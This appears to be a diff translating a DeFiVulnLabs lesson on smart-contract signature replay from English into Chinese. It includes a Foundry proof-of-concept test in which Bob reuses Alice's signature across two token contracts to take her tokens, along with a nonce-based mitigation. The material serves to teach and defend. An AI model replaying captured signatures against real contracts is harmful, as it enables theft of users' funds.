@@ -1,24 +1,27 @@
-#  Signature replay  
-[SignatureReplay.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SignatureReplay.sol)  
-**Name:** Signature Replay Vulnerability
+# 签名重放
+[SignatureReplay.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SignatureReplay.sol) 
+ 
+**名称：** 签名重放漏洞  
 
-**Description:**  
-In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's accountto Bob's account. 
+**描述：**  
+在这种情况下，Alice签署了一项交易，允许Bob将代币从Alice的账户转移到Bob 的账户。  
 
-Bob then replays this signature on multiple contracts (in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens from Alice's account to his. This is possible because the contracts use the same methodology for signing and validating transactions, but they do not share a nonce to prevent replay attacks.
+然后，Bob在多个合约（在本例中为 TokenWhale 和 SixEyeToken 合约）上重放此签名，  
+每次都授权将代币从Alice的账户转移到他的账户。这是可能的，因为合约使用相同的方法来签署和验证交易，  
+但是它们没有共享用于防止重放攻击的nonce。   
 
-Missing protection against signature replay attacks, Same signature can be used multiple times to execute a function.
+缺少针对签名重放攻击的保护，可以多次使用相同的签名来执行函数。  
 
-**Mitigation:**  
-Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process.
 
-**REF**:
+**缓解建议：**   
+可以通过在签名和验证过程中使用nonce（仅使用一次的数字）来防止重放攻击。  
 
-https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57
+**参考：**  
+https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57  
+https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25  
 
-https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25
 
-**TokenWhale** **Contract:**  
+**TokenWhale合约：**  
 ```
 contract TokenWhale is Test {
     address player;
@@ -79,20 +82,19 @@ contract TokenWhale is Test {
         return true;
     }
 }
-```
-**How to Test:**
-
-forge test --contracts src/test/**SignatureReplay.sol** -vvvv
-```
-// A function to demonstrate a replay attack using token contracts.
+```  
+**如何测试：**  
+forge test --contracts src/test/SignatureReplay.sol -vvvv 
+```  
+// 使用代币合约演示重放攻击的函数
 function testSignatureReplay() public {
-    // Emit the current balance of the contract.
+    // 记录合约的当前余额。
     emit log_named_uint(
         "Balance",
         TokenWhaleContract.balanceOf(address(this))
     );
 
-    // Generate a unique hash from the input data.
+    // 根据输入数据生成唯一的哈希值
     bytes32 hash = keccak256(
         abi.encodePacked(
             address(alice),
@@ -103,32 +105,32 @@ function testSignatureReplay() public {
         )
     );
 
-    // Log the hash.
+    // 记录哈希值
     emit log_named_bytes32("hash", hash);
 
-    // Sign the hash with the private key of the address.
+    // 使用地址的私钥对哈希进行签名
     (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
 
-    // Log the signature components.
+    // 记录签名组成部分
     emit log_named_uint("v", v);
     emit log_named_bytes32("r", r);
     emit log_named_bytes32("s", s);
 
-    // Recover the signer's address from the signature.
+    // 从签名中恢复签名者的地址
     address alice_address = ecrecover(hash, v, r, s);
 
-    // Log the signer's address.
+    // 记录签名者的地址
     emit log_named_address("alice_address", alice_address);
 
-    // Notify the possible attack.
+    // 提示可能的攻击
     emit log_string(
         "If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method."
     );
 
-    // Bob becomes the prankster.
+    // Bob变成了恶作剧者
     vm.startPrank(bob);
 
-    // Bob uses Alice's signature to transfer tokens from Alice's account to his account.
+    // Bob使用Alice的签名将代币从Alice的账户转移到他自己的账户
     TokenWhaleContract.transferProxy(
         address(alice),
         address(bob),
@@ -139,24 +141,24 @@ function testSignatureReplay() public {
         s
     );
 
-    // Log Bob's new balance.
+    // 记录Bob的新余额
     emit log_named_uint(
         "SET token balance of Bob",
         TokenWhaleContract.balanceOf(address(bob))
     );
 
-    // Log the next step of the attack.
+    // 记录攻击的下一步
     emit log_string(
         "Try to replay to another contract with same signature"
     );
 
-    // Log Bob's balance in another token before the replay.
+    //在重放之前，记录Bob在另一个代币中的余额。
     emit log_named_uint(
         "Before the replay, SIX token balance of bob:",
         SixEyeTokenContract.balanceOf(address(bob))
     );
 
-    // Bob uses Alice's signature to transfer tokens in a different contract.
+    // Bob使用Alice的签名在不同的合约中转移代币
     SixEyeTokenContract.transferProxy(
         address(alice),
         address(bob),
@@ -167,13 +169,13 @@ function testSignatureReplay() public {
         s
     );
 
-    // Log Bob's new balance in the second contract.
+    // 记录Bob在第二份合约中的新余额
     emit log_named_uint(
         "After the replay, SIX token balance of bob:",
         SixEyeTokenContract.balanceOf(address(bob))
     );
 
-    // Bob attempts to replay the attack on the same contract, but this fails due to the nonce check.
+    // Bob尝试在同一个合约上重放攻击，但由于随机数检查而失败
     SixEyeTokenContract.transferProxy(
         address(alice),
         address(bob),
@@ -184,12 +186,12 @@ function testSignatureReplay() public {
         s
     );
 
-    // Log Bob's balance after the second attempt.
+    //  第二次尝试后记录Bob的余额
     emit log_named_uint(
         "After the second replay, SIX token balance of bob:",
         SixEyeTokenContract.balanceOf(address(bob))
     );
 }
-```
-Red box: signature replayed.
+```  
+**红框：** 签名重放。  
 ![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F25146438-71a8-47bc-a7e7-a32ea63cf6b0%2FUntitled.png?table=block&id=19975d97-c976-4b16-9e9a-2cf903bf0b5f&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)
